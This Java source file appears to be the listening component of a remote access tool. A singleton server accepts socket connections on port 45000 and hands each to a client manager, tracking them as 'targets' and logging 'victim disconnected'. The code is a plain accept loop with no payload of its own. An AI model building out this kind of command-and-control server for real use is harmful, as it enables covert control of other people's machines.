package onion.aluka.core;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.logging.Level;

import onion.aluka.AlukAserverApplication;
import onion.aluka.ClientManager;
import onion.aluka.LoggerManagement;
import onion.aluka.datas.TargetRepository;

public class ServerAluka implements Runnable{

	//Variables
	private static ServerAluka instance;
	private static int PORT = 45000;
	private static ServerSocket serverSocket;
	private final static LoggerManagement loggerManagement = LoggerManagement.getInstance();

	public TargetRepository targetRepository;
	
	private ServerAluka(TargetRepository targetRepository) {
		try {
			this.targetRepository = targetRepository;
			loggerManagement.log(Level.INFO, "Initialising server on port " + PORT);
			serverSocket = new ServerSocket(PORT);
		} catch (Exception e) {
			loggerManagement.log(Level.SEVERE, "Can not initialize Server");
		}
	}

	public static ServerAluka getInstance(TargetRepository repository) {
		if(instance == null)
			instance = new ServerAluka(repository);
		return instance;
	}
	
	public static void changePort(int port) {
		PORT = port;
		//TODO
	}

	@Override
	public void run() {
		while (AlukAserverApplication.isRunning) {
			try {
				Socket socket = serverSocket.accept();
				Thread clients = new Thread(new ClientManager(socket,targetRepository));
				clients.start();
			}catch (IOException e) {
				loggerManagement.log(Level.WARNING, "victim disconnected");
			}
			
		}
	}
}
